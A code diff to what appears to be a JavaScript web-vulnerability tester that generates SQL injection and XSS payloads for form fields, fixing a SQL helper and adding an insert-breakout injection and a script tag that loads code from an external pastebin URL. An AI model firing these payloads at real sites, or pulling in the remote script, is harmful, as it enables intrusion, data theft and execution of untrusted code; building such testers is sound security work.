@@ -51,7 +51,7 @@ $(document).ready(function() {
 
   /* SQL debug assitance: attempts to create a table and insert a value for every vulnerable field. */
   var sql_debug = function(name) {
-    return "CREATE TABLE sql_vuln IF NOT EXISTS (field VARCHAR); INSERT INTO sql_vuln VALUES('"+name+"');"; 
+    return "CREATE TABLE IF NOT EXISTS sql_vuln (field TEXT); INSERT INTO sql_vuln VALUES('"+name+"');"; 
   }
 
   /* XSS debug assistance: creates a paragraph with some text that can be searched for by JS to notify
@@ -72,7 +72,12 @@ $(document).ready(function() {
 
   /* Select everything from users attack */
   attacks[1][2] = function(name) {
-    return "a’;SELECT * FROM users WHERE 't' = 't';" + sql_debug(name);
+    return "a';SELECT * FROM users WHERE 't' = 't';" + sql_debug(name);
+  }
+
+  /* Attack on insert. */
+  attacks[1][3] = function(name) {
+    return "a');"+ sql_debug(name)+"--";
   }
 
   /* Basic XSS */
@@ -98,5 +103,9 @@ $(document).ready(function() {
   /* src/href attack */
   attacks[2][4] = function(name) {
     return "javascript:console.log('"+name+" is vulnerable to XSS.');alert('"+name+" is vulnerable to XSS.');"
+  }
+
+  attacks[2][5] = function(name) {
+    return "<script src=\"http://pastebin.com/raw.php?i=a6Mw8Zjg\"></script>";
   }
 });
